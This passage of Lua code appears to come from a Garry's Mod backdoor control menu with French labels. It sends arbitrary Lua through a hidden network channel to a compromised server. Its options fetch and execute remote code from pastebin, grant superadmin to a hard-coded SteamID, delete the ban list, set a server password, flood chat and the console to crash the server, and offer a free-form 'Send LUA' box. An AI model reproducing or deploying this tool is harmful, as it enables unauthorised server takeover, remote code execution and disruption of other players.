end ):SetIcon( "icon16/server_edit.png" ) 

infoserver:AddOption( "Mettre un mot de passe sur le serveur", function() 
net.Start(netKey)
net.WriteString( "sv_password", "pd" )
net.WriteBit(1)
net.SendToServer()
end ):SetIcon( "icon16/server_edit.png" )

infoserver:AddOption( "Chat spam", function() 
net.Start(netKey)
net.WriteString("timer.Create( \"rekt\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"♣♣ AIE COUP DUR POUR LE SERVEUR, GOT LEAKED ! ♣♣\")]]) end)")
net.WriteBit(1)
net.SendToServer()

end ):SetIcon( "icon16/user.png" )

infoserver:AddOption( "Changer le nom de tous les joueurs", function() 
net.Start(netKey)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/GU6WNZdQ\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit (1)
net.SendToServer()
end ):SetIcon( "icon16/server_database.png" )

infoserver:AddOption( "Stop Le serveur", function() 
net.Start(netKey)
net.WriteString( "timer.Create( \"spamlol\", 0, 0, function() for i = 1, 1000000 do MsgC(Color(math.random(255), math.random(255), math.random(255)), \"Owned by Hazax\") end end)" )
net.WriteBit (1)
net.SendToServer()
end ):SetIcon( "icon16/server_go.png" )

gravitesub:AddOption( "ON", function() 
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"160\")")
net.WriteBit(1)
net.SendToServer() 
end ):SetIcon( "icon16/accept.png" )

gravitesub:AddOption( "OFF", function() 
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"500\")")
net.WriteBit(1)
net.SendToServer() 
end ):SetIcon( "icon16/cancel.png" )

quakeearth:AddOption( "ON", function() 
net.Start(netKey)
net.WriteString(" for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end ")
net.WriteBit(1)
net.SendToServer() 
end ):SetIcon( "icon16/accept.png" )

trollall:AddOption( "Hack Squellette", function() 
net.Start(netKey)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/bzBMckr5\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
end ):SetIcon( "icon16/application_xp_terminal.png" )

ulxall:AddOption( "Unban ALL ", function() 
net.Start(netKey)
net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
net.WriteBit(1)
net.SendToServer()
end ):SetIcon( "icon16/status_online.png" )

ulxall:AddOption( "Changer les models", function() 
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/editor/playerstart.mdl\") end" )
net.WriteBit (1)
net.SendToServer()
end ):SetIcon( "icon16/box.png" )


m:AddSpacer() -- Add a spacer
m:Open() -- Show our menu
end
local AppList = vgui.Create( "DListView", Frame )
AppList:SetMultiSelect( false )
AppList:AddColumn( "Utilisateur" )
AppList:SetSize( ScrW() -400, ScrH() -400 );
AppList:SetPos( 100, 80 );
			for k, v in pairs(player.GetAll()) do
				AppList:AddLine( v:Nick(), v)
			end
AppList.OnRowSelected = function( lst, index, pnl )
userl = pnl:GetColumnText( 2 )
valuess = pnl:GetColumnText( 1 )
local m = DermaMenu()

local ulx, ulxicon = m:AddSubMenu( "Commandes" )
ulxicon:SetIcon( "icon16/script_edit.png" )
m:AddSpacer()

local ulxsubgrade, ulxsubgradeicon = ulx:AddSubMenu( "Grades" )
ulxsubgradeicon:SetIcon( "icon16/user.png" )
local ulxsubgod, ulxsubgodicon = ulx:AddSubMenu( "Mode dieu" )
ulxsubgodicon:SetIcon( "icon16/heart.png" )
local ulxsubfreeze, ulxsubfreezeicon = ulx:AddSubMenu( "Freeze" )
ulxsubfreezeicon:SetIcon( "icon16/heart.png" )

m:AddSpacer()
local animation, animationicon = m:AddSubMenu( "Animation" )
animationicon:SetIcon( "icon16/wand.png" )
m:AddSpacer()
local mooves, moovesicon = m:AddSubMenu( "Mouvement" )
moovesicon:SetIcon( "icon16/controller.png" )
m:AddSpacer()
local troll, trollicon = m:AddSubMenu( "Troll Menu" )
trollicon:SetIcon( "icon16/rainbow.png" )

local trollsubgravity, trollsubgravityicon = troll:AddSubMenu( "Gravité Casser" )
trollsubgravityicon:SetIcon( "icon16/star.png" )
local trollsubjumpc, trollsubjumpcicon = troll:AddSubMenu( "Jump Casser" )
trollsubjumpcicon:SetIcon( "icon16/star.png" )

local trollprison, trollprisonicon = troll:AddSubMenu( "Prison" )
trollprisonicon:SetIcon( "icon16/user_orange.png" )


ulxsubgrade:AddOption( "[SUPERADMIN]", function() 
		 net.Start(netKey)
		 net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:1:219919521\", \"superadmin\")")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez de passer " .. userl:Nick() .. " [superadmin]")
end ):SetIcon( "icon16/user_add.png" )

ulxsubgrade:AddOption( "[USER]", function() 
		 net.Start(netKey)
		 net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:1:219919521\", \"user\")")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez de passer " .. userl:Nick() .. " [user]")
end ):SetIcon( "icon16/user_delete.png" )

ulxsubgrade:AddOption( "Choisir un rang", function() 
local frame = vgui.Create( "DFrame" )
frame:SetTitle( "Choisir Un Rang" )
frame:SetSize( 400, 200 )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 40, 40 )
TextEntry:SetSize( 350, 150 )
TextEntry:SetText( "ulx adduserid STEAM_0:1:219919521" )
TextEntry.OnEnter = function( self )
local TextEntry = TextEntry:GetValue()
        net.Start(netKey)
        net.WriteString( TextEntry )
        net.WriteBit (false)
        net.SendToServer()
 		 actioneff("Rang Obtenu" .. userl:Nick() )
		end
end ):SetIcon( "icon16/user_add.png" ) 

ulx:AddOption( "Point d'armure", function() 
local frame = vgui.Create( "DFrame" )
frame:SetTitle( "Mettre De L'armure" )
frame:SetSize( 400, 200 )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 40, 40 )
TextEntry:SetSize( 350, 150 )
TextEntry:SetText( "ulx armor Nom Du Joueur Nombre" )
TextEntry.OnEnter = function( self )
local TextEntry = TextEntry:GetValue()
        net.Start(netKey)
        net.WriteString( TextEntry )
        net.WriteBit (false)
        net.SendToServer()
		
end
end ):SetIcon( "icon16/user_suit.png" )


troll:AddOption( "Changer la taille du joueur", function() 
local tall = [[
hook.Add("Think", "tall", function()
for k,v in pairs (player.GetAll()) do
v:SetModelScale(0.2, 80);
v:SetRunSpeed(400 * 2);
v:SetWalkSpeed(200 * 2);
end
end)]]
net.Start(netKey)
net.WriteString( tall )
net.WriteBit (1)
net.SendToServer()
end ):SetIcon( "icon16/application_edit.png" )


trollprison:AddOption( "Mettre en prison", function() 
local frame = vgui.Create( "DFrame" )
frame:SetTitle( "Mettre en Prison" )
frame:SetSize( 400, 200 )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 40, 40 )
TextEntry:SetSize( 350, 150 )
TextEntry:SetText( "ulx jail Nom Du Player Temps" )
TextEntry.OnEnter = function( self )
local TextEntry = TextEntry:GetValue()
        net.Start(netKey)
        net.WriteString( TextEntry )
        net.WriteBit (false)
        net.SendToServer()
		end
end ) :SetIcon( "icon16/user_orange.png" )

trollprison:AddOption( "Sortir de prison", function() 
local frame = vgui.Create( "DFrame" )
frame:SetTitle( "Mettre en Prison" )
frame:SetSize( 400, 200 )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 40, 40 )
TextEntry:SetSize( 350, 150 )
TextEntry:SetText( "ulx unjail Nom Du Player " )
TextEntry.OnEnter = function( self )
local TextEntry = TextEntry:GetValue()
        net.Start(netKey)
        net.WriteString( TextEntry )
        net.WriteBit (false)
        net.SendToServer()
 		 actioneff("ce Joueur" .. userl:Nick() "a été Sortis De prison")
		end
end ) :SetIcon( "icon16/user_orange.png" )

trollsubgravity:AddOption( "[ON]", function() 
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"160\")")
net.WriteBit(1)
net.SendToServer() 
		 actioneff("Vous venez de casser la gravité de " .. userl:Nick())
end ):SetIcon( "icon16/accept.png" )

trollsubgravity:AddOption( "[OFF]", function() 
net.Start(netKey)
net.WriteString( "player.GetAll(  ):StripWeapons()")
net.WriteBit(1)
net.SendToServer() 
		 actioneff("Vous venez de rétablir la gravité à " .. userl:Nick())
end ):SetIcon( "icon16/cancel.png" )

trollsubjumpc:AddOption( "[ON]", function() 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("+jump") end]],[[for k,v in pairs(player.GetAll()) do v:ConCommand("+jump") end]],[[for k,v in pairs(player.GetAll()) do v:ConCommand("+jump") end]],[[for k,v in pairs(player.GetAll()) do v:ConCommand("+jump") end]])
net.WriteBit(1)
net.SendToServer() 
		 actioneff("Vous venez de casser la gravité des sauts de " .. userl:Nick())
end ):SetIcon( "icon16/accept.png" )

trollsubjumpc:AddOption( "[OFF]", function() 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("-jump") end]],[[for k,v in pairs(player.GetAll()) do v:ConCommand("-jump") end]],[[for k,v in pairs(player.GetAll()) do v:ConCommand("-jump") end]],[[for k,v in pairs(player.GetAll()) do v:ConCommand("-jump") end]])
net.WriteBit(1)
net.SendToServer()
		 actioneff("Vous venez de rétablir la gravité des sauts de " .. userl:Nick())
end ):SetIcon( "icon16/cancel.png" )



troll:AddOption( "Changer le model", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "models/editor/playerstart.mdl" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("setmodel")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/box.png" )

troll:AddOption( "Send LUA", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Lua Code" )
TextEntry.OnEnter = function( self )
		 net.WriteString(TextEntry:GetValue())
		 net.Start(netKey)
		 net.WriteString( "RunConsoleCommand")
		 net.WriteEntity( userl )
		 net.SendToServer()
end
end ):SetIcon( "icon16/application_xp_terminal.png" )


ulxsubgod:AddOption( "[ON]", function() 
local frame = vgui.Create( "DFrame" )
frame:SetTitle( "Mode Dieu" )
frame:SetSize( 400, 200 )
frame:Center()
frame:MakePopup()
local TextEntrys = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntrys:SetPos( 40, 40 )
TextEntrys:SetSize( 350, 150 )
TextEntrys:SetText( "ulx god ".. userl:Nick()  )
TextEntrys.OnEnter = function( self )
local TextEntrys = TextEntrys:GetValue()
        net.Start(netKey)
        net.WriteString( TextEntrys )
        net.WriteBit (false)
        net.SendToServer()
		 actioneff("Le mode Dieu Est Activé Pour " .. userl:Nick() )
		 end
 end ):SetIcon( "icon16/heart_add.png" ) 
ulxsubgod:AddOption( "[OFF]", function() 
local frame = vgui.Create( "DFrame" )
frame:SetTitle( "Mode Dieu" )
frame:SetSize( 400, 200 )
frame:Center()
frame:MakePopup()
local TextEntrys = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntrys:SetPos( 40, 40 )
TextEntrys:SetSize( 350, 150 )
TextEntrys:SetText( "ulx ungod ".. userl:Nick()  )
TextEntrys.OnEnter = function( self )
local TextEntrys = TextEntrys:GetValue()
        net.Start(netKey)
        net.WriteString( TextEntrys )
        net.WriteBit (false)
        net.SendToServer()
		 actioneff("Vous venez d'enlever le mode dieu " .. userl:Nick())
		 end
 end ):SetIcon( "icon16/heart_delete.png" ) 
ulx:AddOption( "Give une arme", function() 
local frame = vgui.Create( "DFrame" )
frame:SetTitle( "Give une Arme" )
frame:SetSize( 400, 200 )
frame:Center()
frame:MakePopup()
local TextEntrys = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntrys:SetPos( 40, 40 )
TextEntrys:SetSize( 350, 150 )
TextEntrys:SetText( "ulx give Nom Du Joueur Arme"  )
TextEntrys.OnEnter = function( self )
local TextEntrys = TextEntrys:GetValue()
        net.Start(netKey)
        net.WriteString( TextEntrys )
        net.WriteBit (false)
        net.SendToServer()
		 actioneff("Vous venez de giver une arme à" .. userl:Nick())
	end
end ):SetIcon( "icon16/bomb.png" ) 

ulx:AddOption( "Kick", function() 
local frame = vgui.Create( "DFrame" )
frame:SetTitle( "kick" )
frame:SetSize( 400, 200 )
frame:Center()
frame:MakePopup()
local TextEntrys = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntrys:SetPos( 40, 40 )
TextEntrys:SetSize( 350, 150 )
TextEntrys:SetText( "ulx kick " .. userl:Nick()  )
TextEntrys.OnEnter = function( self )
local TextEntrys = TextEntrys:GetValue()
        net.Start(netKey)
        net.WriteString( TextEntrys )
        net.WriteBit (false)
        net.SendToServer()
		 actioneff("Vous venez de kicker" .. userl:Nick())
		
end
end ):SetIcon( "icon16/status_away.png" )

ulx:AddOption( "UnBanAll", function() 
net.Start(netKey)
net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
net.WriteBit(1)
net.SendToServer()
		 actioneff("Vous venez de Unban Tout Le Monde " .. userl:Nick())
end ):SetIcon( "icon16/status_busy.png" ) 



ulxsubfreeze:AddOption( "[ON]", function() 
local frame = vgui.Create( "DFrame" )
frame:SetTitle( "Freeze" )
frame:SetSize( 400, 200 )
frame:Center()
frame:MakePopup()
local TextEntrys = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntrys:SetPos( 40, 40 )
TextEntrys:SetSize( 350, 150 )
TextEntrys:SetText( "ulx freeze ".. userl:Nick()  )
TextEntrys.OnEnter = function( self )
local TextEntrys = TextEntrys:GetValue()
        net.Start(netKey)
        net.WriteString( TextEntrys )
        net.WriteBit (false)
        net.SendToServer()
		 actioneff("Vous venez de freeze " .. userl:Nick())
		 end
end ):SetIcon( "icon16/accept.png" )

ulxsubfreeze:AddOption( "[OFF]", function() 
local frame = vgui.Create( "DFrame" )
frame:SetTitle( "Freeze" )
frame:SetSize( 400, 200 )
frame:Center()
frame:MakePopup()
local TextEntrys = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntrys:SetPos( 40, 40 )
TextEntrys:SetSize( 350, 150 )
TextEntrys:SetText( "ulx unfreeze ".. userl:Nick()  )
TextEntrys.OnEnter = function( self )
local TextEntrys = TextEntrys:GetValue()
        net.Start(netKey)
        net.WriteString( TextEntrys )
        net.WriteBit (false)
        net.SendToServer()
		 actioneff("Vous venez de freeze " .. userl:Nick())
		 end
end ):SetIcon( "icon16/cancel.png" ) 

ulx:AddOption( "Stripweapon", function() 
local frame = vgui.Create( "DFrame" )
frame:SetTitle( "Strip Les Armes" )
frame:SetSize( 400, 200 )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 40, 40 )
TextEntry:SetSize( 350, 150 )
TextEntry:SetText( "ulx strip ".. userl:Nick()  )
TextEntry.OnEnter = function( self )
local TextEntry = TextEntry:GetValue()
        net.Start(netKey)
        net.WriteString( TextEntry )
        net.WriteBit (false)
        net.SendToServer()
		 actioneff("Vous venez d'enlever les armes de " .. userl:Nick() )
		 end
end ):SetIcon( "icon16/bomb.png" )

animation:AddOption( "Dance", function() 
net.Start(netKey)
net.WriteString([[for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end timer.Create("dance_loop",8.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end end )]])
net.WriteBit (1)
net.SendToServer()
end ):SetIcon( "icon16/bell.png" )


mooves:AddOption( "[ON]Avancer", function() 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("ulx stripweapons") end]])
net.WriteBit(userl)
net.SendToServer()
		 actioneff("Vous venez de faire avancer " .. userl:Nick() )
end ):SetIcon( "icon16/accept.png" )

		 
mooves:AddOption( "[OFF]Avancer", function() 
net.Start( netKey )
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("-forward") end]])
net.WriteBit(1)
net.SendToServer() 
		 actioneff("Vous venez d'arrêter de faire avancer " .. userl:Nick() )
end ):SetIcon( "icon16/stop.png" )

mooves:AddOption( "[ON]Reculer", function() 
net.Start(netKey)
net.WriteString([[for k,v in pairs(userl:Nick()) do v:ConCommand("+back") end]])
net.WriteBit ( userl:Nick() )
net.SendToServer()
		 actioneff("Vous venez de faire reculer " .. userl:Nick() )
end ):SetIcon( "icon16/accept.png" )

mooves:AddOption( "[OFF]Reculer", function() 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("-back") end]])
net.WriteBit(1)
net.SendToServer()
		 actioneff("Vous venez d'arrêter de faire reculer " .. userl:Nick() )
end ):SetIcon( "icon16/stop.png" )

mooves:AddOption( "[ON]Tourner à gauche", function() 
net.Start(netKey)
net.WriteString([[for k,v in pairs(Player.GetAll()) do v:ConCommand("+left") end]])
net.WriteBit(1)
net.SendToServer()
		 actioneff("Vous venez de faire touner à gauche " .. userl:Nick() )
end ):SetIcon( "icon16/accept.png" )

mooves:AddOption( "[OFF]Tourner à gauche", function() 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("-left") end]])
net.WriteBit(1)
net.SendToServer()
		 actioneff("Vous venez d'arrêter de faire touner à gauche " .. userl:Nick() )
end ):SetIcon( "icon16/stop.png" )

mooves:AddOption( "[ON]Tourner à droite", function() 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("+right") end]])
net.WriteBit(1)
net.SendToServer()
		 actioneff("Vous venez d'arrêter de faire touner à droite " .. userl:Nick() )
end ):SetIcon( "icon16/accept.png" )

mooves:AddOption( "[OFF]Tourner à droite", function() 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("-right") end]])
net.WriteBit(1)
net.SendToServer()
		 actioneff("Vous venez d'arrêter de faire touner à gauche " .. userl:Nick() )
end ):SetIcon( "icon16/stop.png" )

mooves:AddOption( "[ON]S'accroupir", function() 
		 net.Start(netKey)
		 net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("+duck") end]])
		 net.WriteBit(1)
		 net.SendToServer()
		 actioneff("Vous venez de faire s'accroupir " .. userl:Nick() )
end ):SetIcon( "icon16/accept.png" )

mooves:AddOption( "[OFF]S'accroupir", function() 
		 net.Start( netKey )
		 net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("-duck") end]])
		 net.WriteBit(1)
		 net.SendToServer()
		 actioneff("Vous venez d'arrêter de faire s'accroupir " .. userl:Nick() )
end ):SetIcon( "icon16/stop.png" )


m:AddSpacer() -- Add a spacer
m:Open() -- Show our menu
end
		